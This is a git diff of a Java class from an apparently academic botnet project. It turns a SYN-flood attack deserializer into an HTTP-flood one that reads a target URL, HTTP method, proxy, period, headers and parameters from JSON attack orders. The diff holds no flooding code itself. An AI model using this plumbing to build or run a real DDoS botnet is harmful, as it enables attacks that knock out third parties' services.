@@ -24,9 +24,10 @@
   THE SOFTWARE.
  */
 
-package com.acmutv.botnet.core.attack.serial;
+package com.acmutv.botnet.core.attack.flooding.serial;
 
-import com.acmutv.botnet.core.attack.SynFloodAttack;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
+import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonParser;
@@ -36,51 +37,54 @@ import com.fasterxml.jackson.databind.deser.std.StdDeserializer;
 
 import java.io.IOException;
 import java.net.URL;
+import java.util.HashMap;
+import java.util.Map;
 
 /**
- * The JSON deserializer for {@link SynFloodAttack}.
+ * The JSON deserializer for {@link HttpFloodAttack}.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
- * @see SynFloodAttack
- * @see SynFloodAttackSerializer
+ * @see HttpFloodAttack
+ * @see HttpFloodAttackSerializer
  */
-public class SynFloodAttackDeserializer extends StdDeserializer<SynFloodAttack> {
+public class HttpFloodAttackDeserializer extends StdDeserializer<HttpFloodAttack> {
 
   /**
-   * The singleton of {@link SynFloodAttackDeserializer}.
+   * The singleton of {@link HttpFloodAttackDeserializer}.
    */
-  private static SynFloodAttackDeserializer instance;
+  private static HttpFloodAttackDeserializer instance;
 
   /**
-   * Returns the singleton of {@link SynFloodAttackDeserializer}.
+   * Returns the singleton of {@link HttpFloodAttackDeserializer}.
    * @return the singleton.
    */
-  public static SynFloodAttackDeserializer getInstance() {
+  public static HttpFloodAttackDeserializer getInstance() {
     if (instance == null) {
-      instance = new SynFloodAttackDeserializer();
+      instance = new HttpFloodAttackDeserializer();
     }
     return instance;
   }
 
   /**
-   * Initializes the singleton of {@link SynFloodAttackDeserializer}.
+   * Initializes the singleton of {@link HttpFloodAttackDeserializer}.
    */
-  private SynFloodAttackDeserializer() {
-    super((Class<SynFloodAttack>) null);
+  private HttpFloodAttackDeserializer() {
+    super((Class<HttpFloodAttack>) null);
   }
 
 
   @Override
-  public SynFloodAttack deserialize(JsonParser parser, DeserializationContext ctx) throws IOException {
+  public HttpFloodAttack deserialize(JsonParser parser, DeserializationContext ctx) throws IOException {
     JsonNode node = parser.getCodec().readTree(parser);
 
-    if (!node.hasNonNull("target")) {
-      throw new IOException("[target] required");
+    if (!node.hasNonNull("method") || !node.hasNonNull("target")) {
+      throw new IOException("[method,target] required");
     }
+    final HttpMethod method = HttpMethod.valueOf(node.get("method").asText());
     final URL target = new URL(node.get("target").asText());
 
-    SynFloodAttack attack = new SynFloodAttack(target);
+    HttpFloodAttack attack = new HttpFloodAttack(method, target);
 
     if (node.has("proxy")) {
       final HttpProxy proxy = HttpProxy.valueOf(node.get("proxy").asText());
@@ -95,6 +99,18 @@ public class SynFloodAttackDeserializer extends StdDeserializer<SynFloodAttack> 
     if (node.hasNonNull("period")) {
       final Interval period = Interval.valueOf(node.get("period").asText());
       attack.setPeriod(period);
+    }
+
+    if (node.hasNonNull("header")) {
+      Map<String,String> header = new HashMap<>();
+      node.get("header").fields().forEachRemaining(f -> header.put(f.getKey(), f.getValue().asText()));
+      attack.setHeader(header);
+    }
+
+    if (node.hasNonNull("params")) {
+      Map<String,String> params = new HashMap<>();
+      node.get("params").fields().forEachRemaining(f -> params.put(f.getKey(), f.getValue().asText()));
+      attack.setParams(params);
     }
 
     return attack;
